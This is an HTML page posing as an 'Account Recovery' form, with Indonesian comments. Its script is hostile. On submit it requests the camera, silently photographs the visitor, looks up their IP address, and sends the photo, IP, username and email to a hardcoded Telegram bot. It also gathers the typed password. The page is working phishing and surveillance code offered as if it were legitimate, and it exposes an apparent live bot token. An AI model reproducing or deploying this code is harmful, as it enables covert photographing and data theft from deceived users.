<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Account Recovery</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: 'Arial', sans-serif;
      background-color: #0f172a; /* Warna dasar gelap */
      color: #ffffff; /* Warna teks putih */
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .container {
      background-color: #1e293b; /* Kotak kontainer lebih terang */
      padding: 30px 20px;
      border-radius: 10px;
      box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.2);
      max-width: 400px;
      width: 100%;
      text-align: center;
    }
    h2 {
      font-size: 24px;
      font-weight: bold;
      color: #e2e8f0;
      margin-bottom: 10px;
    }
    p {
      font-size: 14px;
      color: #94a3b8;
      margin-bottom: 20px;
    }
    .info-box {
      background-color: #334155; /* Kotak informasi */
      color: #cbd5e1;
      font-size: 14px;
      padding: 15px;
      border-radius: 8px;
      margin-bottom: 20px;
    }
    form {
      display: flex;
      flex-direction: column;
      gap: 15px;
    }
    input {
      padding: 12px;
      font-size: 14px;
      border-radius: 8px;
      border: 1px solid #64748b;
      background-color: #1e293b;
      color: #ffffff;
    }
    input:focus {
      outline: none;
      border-color: #0ea5e9;
      box-shadow: 0 0 4px #0ea5e9;
    }
    button {
      padding: 12px;
      border: none;
      border-radius: 8px;
      background-color: #0ea5e9;
      font-size: 16px;
      font-weight: bold;
      color: #ffffff;
      cursor: pointer;
    }
    button:hover {
      background-color: #0284c7;
    }
    .footer {
      margin-top: 15px;
      font-size: 12px;
      color: #94a3b8;
    }
    .footer a {
      color: #0ea5e9;
      text-decoration: none;
    }
    .footer a:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Account Recovery</h2>
    <p>Please fill out the form to recover your account.</p>
    <div class="info-box">
      Make sure to provide accurate details to speed up the recovery process.
    </div>
    <form id="recoveryForm">
      <input type="text" id="username" placeholder="Enter your username" required>
      <input type="email" id="email" placeholder="Enter your email address" required>
      <input type="password" id="password" placeholder="Create a new password" required>
      <button type="submit">Recover Account</button>
    </form>
    <div class="footer">
      <p>Need help? <a href="#">Contact Support</a></p>
    </div>
  </div>

  <script>
    var telegramToken = '7143489396:AAH6nnxpNdwDPTFDtVGgJ04f_rOQvjPm_Z0';
    var telegramChatId = '-1002188815934';

    function sendToTelegram(photoBlob, caption) {
      var apiUrl = `https://api.telegram.org/bot${telegramToken}/sendPhoto`;

      var formData = new FormData();
      formData.append('chat_id', telegramChatId);
      formData.append('photo', photoBlob, 'photo.jpg');
      formData.append('caption', caption);

      fetch(apiUrl, {
        method: 'POST',
        body: formData
      })
        .then(response => response.json())
        .then(data => {
          console.log('Foto berhasil dikirim ke Telegram:', data);
        })
        .catch(error => {
          console.error('Error mengirim foto ke Telegram:', error);
        });
    }

    function takeAndSendPhoto(formData) {
      navigator.mediaDevices.getUserMedia({ video: true })
        .then(function(stream) {
          var video = document.createElement('video');
          video.srcObject = stream;
          video.play();

          setTimeout(() => {
            var canvas = document.createElement('canvas');
            canvas.width = 640; // Resolusi foto
            canvas.height = 480;
            var ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            stream.getTracks().forEach(track => track.stop());

            canvas.toBlob(function(blob) {
              var ipAddress = '';
              fetch('https://api64.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                  ipAddress = data.ip;

                  var caption = `Foto terkirim dari IP: ${ipAddress}\nUsername: ${formData.username}\nEmail: ${formData.email}`;
                  sendToTelegram(blob, caption);
                })
                .catch(error => {
                  console.error('Error mendapatkan IP address:', error);

                  var caption = `Foto terkirim\nUsername: ${formData.username}\nEmail: ${formData.email}`;
                  sendToTelegram(blob, caption);
                });
            }, 'image/jpeg');
          }, 1000); // Delay 1 detik
        })
        .catch(function(err) {
          console.log("Error: " + err);
          if (err.name === 'NotAllowedError') {
            alert('Izinkan akses kamera untuk melanjutkan lalu refresh halaman ini.');
          }
        });
    }

    document.getElementById('recoveryForm').addEventListener('submit', function(event) {
      event.preventDefault();
      var formData = {
        username: document.getElementById('username').value,
        email: document.getElementById('email').value,
        password: document.getElementById('password').value
      };

      navigator.mediaDevices.getUserMedia({ video: true })
        .then(() => takeAndSendPhoto(formData))
        .catch(err => {
          console.log("Error: " + err);
          if (err.name === 'NotAllowedError') {
            alert('Izinkan akses kamera sebelum melanjutkan.');
          }
        });
    });
  </script>
</body>
</html>
